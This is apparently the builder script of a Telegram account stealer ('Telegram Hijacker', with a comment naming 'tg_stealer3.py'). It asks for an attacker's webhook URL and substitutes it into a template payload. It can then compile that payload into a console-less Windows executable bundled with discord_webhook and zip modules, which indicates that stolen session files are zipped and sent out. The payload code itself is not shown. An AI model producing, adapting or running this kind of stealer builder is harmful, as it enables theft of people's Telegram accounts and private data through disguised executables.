import sys
import os

#pyinstaller --noconfirm --onefile --windowed --hidden-import "discord_webhook" --hidden-import "win32con" --hidden-import "win32com" --hidden-import "zip_files" --hidden-import "shutil" --hidden-import "winshell"  "C:\Users\my-je\Downloads\telegram_hijacker-main\tg_stealer3.py"

def create_python_file(hook, file_name):
    with open('src/hijacker.py', 'r', encoding='utf-8') as f1:
        content = f1.read()

    updated_content = (
        content
        .replace("hook_url", hook)
        .replace("file_name", file_name)
    )

    with open(file_name, 'w', encoding='utf-8') as f2:
        f2.write(updated_content)

def main():

    RED = "\33[31m"
    logo= f"""
    {RED}
    ▄▄▄█████▓▓█████  ██▓    ▓█████   ▄████  ██▀███  ▄▄▄      ███▄ ▄███▓      ██░ ██  ██▓ ▄▄▄██▀▀▀▄▄▄      ▄████▄   ██ ▄█▀▓█████  ██▀███     
    ▓  ██▒ ▓▒▓█   ▀ ▓██▒    ▓█   ▀  ██▒ ▀█▒▓██ ▒ ██▒████▄   ▓██▒▀█▀ ██▒     ▓██░ ██▒▓██▒   ▒██  ▒████▄   ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒   
    ▒ ▓██░ ▒░▒███   ▒██░    ▒███   ▒██░▄▄▄░▓██ ░▄█ ▒██  ▀█▄ ▓██    ▓██░     ▒██▀▀██░▒██▒   ░██  ▒██  ▀█▄ ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒   
    ░ ▓██▓ ░ ▒▓█  ▄ ▒██░    ▒▓█  ▄ ░▓█  ██▓▒██▀▀█▄ ░██▄▄▄▄██▒██    ▒██      ░▓█ ░██ ░██░▓██▄██▓ ░██▄▄▄▄██▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄     
      ▒██▒ ░ ░▒████▒░██████▒░▒████▒░▒▓███▀▒░██▓ ▒██▒▓█   ▓██▒██▒   ░██▒     ░▓█▒░██▓░██░ ▓███▒   ▓█   ▓██▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒   
      ▒ ░░   ░░ ▒░ ░░ ▒░▓  ░░░ ▒░ ░ ░▒   ▒ ░ ▒▓ ░▒▓░▒▒   ▓▒█░ ▒░   ░  ░      ▒ ░░▒░▒░▓   ▒▓▒▒░   ▒▒   ▓▒█░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░   
        ░     ░ ░  ░░ ░ ▒  ░ ░ ░  ░  ░   ░   ░▒ ░ ▒░ ▒   ▒▒ ░  ░      ░      ▒ ░▒░ ░ ▒ ░ ▒ ░▒░    ▒   ▒▒ ░ ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░   
      ░         ░     ░ ░      ░   ░ ░   ░   ░░   ░  ░   ▒  ░      ░         ░  ░░ ░ ▒ ░ ░ ░ ░    ░   ▒  ░        ░ ░░ ░    ░     ░░   ░    
                ░  ░    ░  ░   ░  ░      ░    ░          ░  ░      ░         ░  ░  ░ ░   ░   ░        ░  ░ ░      ░  ░      ░  ░   ░        
                                                                                                     ░                                  
                                                                @NeoMetalx1"""
    print(logo)

    hook = input("[Enter web hook url]: ")
    file_name = input("[Enter text to name file]: ")
    
    print("   1. Build python file\n   2. Build exe file")
    user_option = int(input("[Choose option]: "))
    
    if user_option == 1:
        create_python_file(hook, file_name) 
        print("   File generated!")
        os.rename(file_name, file_name + ".py")
    if user_option == 2:
        create_python_file(hook, file_name) 
        os.system("pip install -r requirements.txt")
        os.system("pyinstaller --onefile --noconsole --hidden-import discord_webhook --hidden-import zip_files --hidden-import shutil generated_file.py")
        print("[+] Check dist folder!")


def set_def_color():
    sys.stdout.write("\033[0m")

if __name__ == "__main__":
    main()

set_def_color()
